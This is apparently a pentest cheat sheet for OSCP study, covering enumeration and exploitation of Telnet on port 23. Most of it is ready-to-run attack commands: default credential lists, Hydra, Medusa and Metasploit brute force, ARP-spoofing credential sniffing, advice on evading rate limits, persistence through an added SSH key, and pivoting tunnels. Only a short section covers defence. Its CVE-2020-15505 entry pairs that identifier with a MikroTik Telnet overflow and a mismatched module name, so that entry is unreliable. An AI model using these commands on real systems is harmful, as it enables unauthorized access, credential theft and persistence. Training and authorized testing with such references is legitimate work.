# Port 23 - Telnet Enumeration & Exploitation

## Service Information

**Port:** 23/TCP
**Service:** Telnet (Telecommunication Network)
**Protocol:** Unencrypted text-based remote access
**Security:** ⚠️ HIGHLY INSECURE - Plaintext credentials, deprecated

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan
nmap -p 23 -sV TARGET_IP

# Detailed scan with scripts
nmap -p 23 -sV -sC TARGET_IP

# All Telnet NSE scripts
nmap -p 23 --script telnet-* TARGET_IP

# Encryption detection
nmap -p 23 --script telnet-encryption TARGET_IP

# Banner grabbing
nmap -p 23 --script banner TARGET_IP
```

### 1.2 Banner Grabbing

```bash
# Netcat
nc -vn TARGET_IP 23

# Telnet client
telnet TARGET_IP 23

# Nmap
nmap -p 23 --script banner TARGET_IP

# Metasploit
msfconsole
use auxiliary/scanner/telnet/telnet_version
set RHOSTS TARGET_IP
run
```

### 1.3 Service Detection

```bash
# Check for Telnet service
nc TARGET_IP 23

# Common banners:
# - "Ubuntu" / "Debian" (Linux)
# - "Windows" (Windows Telnet)
# - Cisco IOS devices
# - Network equipment (switches, routers)
```

---

## 2. Manual Connection & Testing

### 2.1 Basic Connection

```bash
# Standard telnet
telnet TARGET_IP

# With specific port
telnet TARGET_IP 23

# Netcat alternative
nc TARGET_IP 23

# Test connectivity
echo "" | nc -vn TARGET_IP 23
```

### 2.2 Common Default Credentials

```bash
# Try common defaults
Username: admin / Password: admin
Username: root / Password: root
Username: administrator / Password: administrator
Username: admin / Password: password
Username: guest / Password: guest

# Cisco devices
Username: cisco / Password: cisco
Username: admin / Password: (blank)

# Network equipment
Username: admin / Password: 1234
Username: user / Password: user
```

---

## 3. Brute Force Attacks

### 3.1 Hydra

```bash
# Single user brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP

# Multiple users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP

# Verbose mode
hydra -l admin -P passwords.txt telnet://TARGET_IP -V

# With timeout (slower connections)
hydra -l admin -P passwords.txt telnet://TARGET_IP -t 4 -w 30

# Faster (more threads)
hydra -l admin -P passwords.txt telnet://TARGET_IP -t 16
```

### 3.2 Medusa

```bash
# Basic brute force
medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M telnet

# Multiple users
medusa -h TARGET_IP -U users.txt -P passwords.txt -M telnet

# Verbose
medusa -h TARGET_IP -u admin -P passwords.txt -M telnet -v 6
```

### 3.3 Nmap Brute Force

```bash
# Nmap telnet brute force
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET_IP

# With default credentials
nmap -p 23 --script telnet-brute TARGET_IP
```

### 3.4 Metasploit

```bash
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS TARGET_IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

## 4. User Enumeration

### 4.1 Username Enumeration via Timing

```bash
# Check timing differences
# Valid user: Slower response
# Invalid user: Faster response

# Script to test usernames
for user in admin root guest user; do
  echo "Testing: $user"
  time echo "$user" | nc TARGET_IP 23
done
```

### 4.2 Metasploit User Enum

```bash
msfconsole
use auxiliary/scanner/telnet/telnet_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
run
```

---

## 5. Exploitation Techniques

### 5.1 Credential Harvesting (MITM)

**⚠️ Only in authorized pentest scenarios!**

```bash
# Wireshark filter for Telnet
tcp.port == 23

# tcpdump capture
tcpdump -i eth0 -A 'tcp port 23'

# Ettercap MITM (ARP spoofing)
ettercap -T -M arp:remote /TARGET_IP/ /GATEWAY_IP/ -i eth0

# All credentials are sent in PLAINTEXT!
```

### 5.2 Post-Exploitation (After Login)

```bash
# After successful login:

# Linux/Unix enumeration
whoami
id
uname -a
cat /etc/passwd
sudo -l

# Windows enumeration
whoami
ipconfig /all
systeminfo
net user
net localgroup administrators

# Privilege escalation
# Check for SUID binaries, kernel exploits, etc.
```

### 5.3 Pivoting via Telnet

```bash
# If Telnet is only accessible from internal network:

# SSH Local Port Forward
ssh -L 2323:INTERNAL_TARGET:23 user@JUMPHOST

# Connect to forwarded port
telnet localhost 2323

# Chisel tunnel
# On Kali: chisel server -p 8000 --reverse
# On Pivot: chisel.exe client KALI_IP:8000 R:2323:INTERNAL_TARGET:23
telnet localhost 2323
```

---

## 6. Cisco/Network Device Enumeration

### 6.1 Cisco Device Detection

```bash
# Telnet to Cisco device
telnet TARGET_IP

# Common Cisco prompts:
# Router>
# Switch>
# Router(config)#

# Enable mode (privileged EXEC)
enable
# Password: (try default passwords)
```

### 6.2 Cisco Default Passwords

```bash
# Common Cisco defaults
cisco/cisco
admin/(blank)
Cisco/Cisco
root/attack

# Common enable passwords
enable
admin
cisco
password
```

### 6.3 Cisco Information Gathering

```bash
# After successful login:

# Show version
show version

# Show running config (if privileged)
show running-config
show startup-config

# Show interfaces
show ip interface brief
show interfaces

# Show users
show users

# Show CDP neighbors (Cisco Discovery Protocol)
show cdp neighbors
show cdp neighbors detail

# Show VLANs (switches)
show vlan

# Show routing table
show ip route
```

---

## 7. Common Vulnerabilities

### 7.1 CVE-2020-15505 (MikroTik RouterOS)

```bash
# MikroTik RouterOS Telnet buffer overflow
# Affects RouterOS versions < 6.46.5

# Metasploit
msfconsole
use exploit/linux/telnet/mikrotik_telnet_creds
set RHOSTS TARGET_IP
exploit
```

### 7.2 Weak/Default Credentials

```bash
# Test common credentials
# See Section 2.2 for default credential list

# Automated testing with Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://TARGET_IP
```

---

## 8. Detection Evasion

### 8.1 Slow Brute Force

```bash
# Evade rate limiting
hydra -l admin -P passwords.txt telnet://TARGET_IP -t 1 -w 10

# Random delays between attempts
# Use custom script with sleep intervals
```

### 8.2 Distributed Attacks

```bash
# Use multiple source IPs (via proxies/VPN)
# Rotate between different attacking machines
```

---

## 9. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Service detection, scripting | `nmap -p 23 -sV -sC TARGET` |
| Hydra | Brute force | `hydra -l admin -P pass.txt telnet://TARGET` |
| Medusa | Brute force | `medusa -h TARGET -u admin -P pass.txt -M telnet` |
| Metasploit | Brute force, exploitation | `use auxiliary/scanner/telnet/telnet_login` |
| Telnet client | Manual connection | `telnet TARGET 23` |
| Netcat | Banner grabbing | `nc TARGET 23` |
| Wireshark | Credential sniffing | Filter: `tcp.port == 23` |

---

## 10. Post-Exploitation Checklist

```bash
# After gaining access:

# 1. Information gathering
whoami
hostname
ip a / ipconfig
cat /etc/passwd (Linux)
net user (Windows)

# 2. Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null (SUID)
systeminfo (Windows patch level)

# 3. Persistence
# Add SSH key
mkdir ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# 4. Lateral movement
# Check for other accessible systems
arp -a
netstat -ano

# 5. Data exfiltration
# Search for sensitive files
find / -name "*.conf" 2>/dev/null
find / -name "*.bak" 2>/dev/null
```

---

## 11. Defense & Mitigation

### 11.1 Disable Telnet

```bash
# Linux - Stop and disable telnet service
sudo systemctl stop telnet.socket
sudo systemctl disable telnet.socket

# Or uninstall
sudo apt remove telnetd

# Windows - Disable via Services or PowerShell
Stop-Service TlntSvr
Set-Service TlntSvr -StartupType Disabled
```

### 11.2 Replace with SSH

```bash
# Use SSH instead (encrypted)
sudo apt install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh

# Configure SSH properly:
# - Disable root login
# - Use key-based authentication
# - Change default port
```

### 11.3 Firewall Rules

```bash
# Block Telnet from external networks
sudo ufw deny 23/tcp

# IPTables
sudo iptables -A INPUT -p tcp --dport 23 -j DROP
```

---

## 12. Quick Reference

### Quick Enumeration
```bash
nmap -p 23 -sV -sC TARGET_IP
nc TARGET_IP 23
```

### Quick Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://TARGET_IP
```

### Common Credentials
```
admin:admin
root:root
cisco:cisco
admin:password
```

### Post-Login Commands
```bash
# Linux
whoami; id; uname -a; sudo -l

# Cisco
show version; show running-config
```

---

## 13. OSCP Tips

⚠️ **Telnet is HIGH priority for OSCP:**
- Often has weak/default credentials
- Plaintext = Easy credential harvesting
- Check EVERY Telnet service found
- Try default credentials FIRST
- Brute force if defaults fail
- Look for Cisco/network equipment
- Credentials might work on SSH/other services (password reuse)

**Common OSCP Telnet scenarios:**
1. Default credentials on network devices
2. Weak passwords on Linux systems
3. Cisco router/switch configuration access
4. Pivoting point to internal networks

---

## 14. Resources

- **HackTricks Telnet**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet
- **Telnet RFC 854**: https://tools.ietf.org/html/rfc854
- **Default Password Lists**: https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
